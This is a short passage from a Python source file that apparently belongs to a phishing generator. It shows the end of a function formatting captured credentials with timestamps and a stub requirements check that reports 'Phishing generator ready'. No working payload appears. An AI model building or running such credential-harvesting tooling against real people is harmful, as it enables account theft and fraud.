            output += f"   Time: {cred['timestamp']}\n\n"

        return output


def check_phishing_requirements() -> tuple[bool, str]:
    """
    Check if system has requirements for phishing generator.

    Returns:
        (can_run: bool, message: str)
    """
    # Phishing generator requires proxy to serve pages
    # No additional system dependencies
    return True, "Phishing generator ready"
